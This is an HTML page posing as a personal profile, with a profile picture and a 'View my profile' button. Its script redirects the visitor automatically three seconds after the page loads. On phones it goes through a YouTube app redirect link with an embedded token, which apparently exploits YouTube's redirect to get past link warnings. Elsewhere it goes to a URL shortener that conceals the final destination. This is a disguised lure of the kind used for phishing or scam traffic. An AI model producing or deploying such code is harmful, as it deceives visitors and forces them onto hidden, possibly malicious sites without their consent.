<body>
  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
  <button onclick="myFunction()">View my profile</button>
<script>
    setTimeout(function() {
      myFunction();
    }, 3000);
    
    function myFunction() {
      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbHQ4SjB4aHRBb09ySkYxYy11ckpUVkdobTJOUXxBQ3Jtc0ttLXM0Y1ZaWkdmaDlYMHg4S3JrOXhhUWpkbEVxR002M3kxdFhxU0xYVlc0ZFJ5T0FHZ1lLZGNYclZVMEt2ZDNVWm1RX3o2dlIzdUxuc2FOVGd4ajl6R0JTcjRtR1FPYzR2aUd2d2tpOTRPMXc4R000cw&q=https%3A%2F%2Fu.to%2F19j-Hg&html_redirect=1";
      
      var fallback = "https://u.to/19j-Hg";

      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
          window.location = app;
          window.setTimeout(function() {
              window.location = fallback;
          }, 25);
      } else {
          window.location = fallback;
      }

      function killPopup() {
          window.removeEventListener('pagehide', killPopup);
      }

      window.addEventListener('pagehide', killPopup);
    }
</script>
